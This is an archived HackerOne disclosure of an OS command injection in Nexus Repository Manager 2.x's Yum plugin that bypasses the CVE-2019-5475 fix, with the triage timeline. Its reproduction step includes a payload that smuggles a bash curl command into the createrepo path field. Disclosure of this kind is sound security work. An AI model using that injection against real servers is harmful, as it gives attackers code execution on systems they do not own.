---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/command-injection-generic
  - env/web
  - vuln/command-injection
  - vuln/code-injection
  - impact/rce
  - trigger/auth-required
substate: "resolved"
weakness: "Command Injection - Generic"
enriched: true
body: true
date: 2019-10-29
submitted: 2019-09-05T03:25:50.622Z
bounty_usd: null
votes: 34
cve: "CVE-2019-15588", "CVE-2019-5475"
program: "[[programs/central-security-project|Central Security Project]]"
reporter: "badcode_"
source: "https://hackerone.com/reports/688270"
title: "OS Command Injection in Nexus Repository Manager 2.x(bypass CVE-2019-5475)"
---
# OS Command Injection in Nexus Repository Manager 2.x(bypass CVE-2019-5475)

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 34 | **Program:** Central Security Project | **Disclosed:** 2019-10-29

- Report: [https://hackerone.com/reports/688270](https://hackerone.com/reports/688270)
- CWE: Command Injection - Generic | CVE: CVE-2019-15588, CVE-2019-5475
- Submitted: 2019-09-05T03:25:50.622Z

## Report summary

https://support.sonatype.com/hc/en-us/articles/360033490774-CVE-2019-5475-Nexus-Repository-Manager-2-OS-Command-Injection-2019-08-09

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## OS Command Injection in Nexus Repository Manager 2.x(bypass CVE-2019-5475)

# Maven artifact

**groupId:** org.sonatype.nexus.plugins
**artifactId:** nexus-yum-repository-plugin
**version:** 2.14.14-01

# Vulnerability

## Vulnerability Description

The Nexus Yum Repository Plugin is vulnerable to Remote Code Execution. All instances using CommandLineExecutor.java with user-supplied data is vulnerable, such as the Yum Configuration Capability.

## Additional Details

Take a look at the patch for CVE-2019-5475

 https://github.com/sonatype/nexus-public/commit/7b9939e71693422d3e09adc3744fa2e9b3a62a63#diff-4ab0523de106ac7a38808f0231fc8a23R84

![](1.png)

The `getCleanCommand` method is not completely filtered and can still be bypassed.



## Steps To Reproduce:

1. Navigate to "Capabilities" in Nexus Repository Manager.

2. Edit or create a new Yum: Configuration capability

3. Set path of "createrepo" or "mergerepo" to an OS command (e.g. `/bin/bash -c curl${IFS}http://192.168.88.1:8000/ || /createrepo`)

   

![](2.png)



## Supporting Material/References:

- Ubuntu
- Sonatype Nexus Repository Manager 2.14.14-01
- Java 8

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

An authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.

## Impact

An authenticated user with sufficient privileges in a Nexus Repository Manager installation can exploit this to execute code on the underlying operating system.

## Timeline

- **Report Filed**
- **2019-09-05** @acazzolla: @badcode_ Thank you for your submission.  We are validating your issue and will reply back shortly.
- **2019-09-12** @badcode_: Have you verified this vulnerability?
- **2019-09-12** @acazzolla: @badcode_ Yes and a fix is pending review now.  How would you like to be credited?
- **2019-09-12** @badcode_: Yes, Badcode & Longofo of Knownsec 404 Team
- **Report Triaged**
- **2019-10-28** @acazzolla: This vulnerability has been fixed and https://support.sonatype.com/hc/en-us/articles/360033490774-CVE-2019-5475-Nexus-Repository-Manager-2-OS-Command-Injection-2019-08-09 has been updated to reflect the appropriate affected and fixed versions along with credit to the researchers that reported this bypass.
- **Report Resolved**
- **2019-10-28** @badcode_: Does this vulnerability have CVE ID?
- **2019-10-28** @acazzolla: HackerOne will be assigning a CVE shortly.
- **Agreed On Going Public**
- **2019-10-28** @badcode_: No, thanks
- **Manually Disclosed**
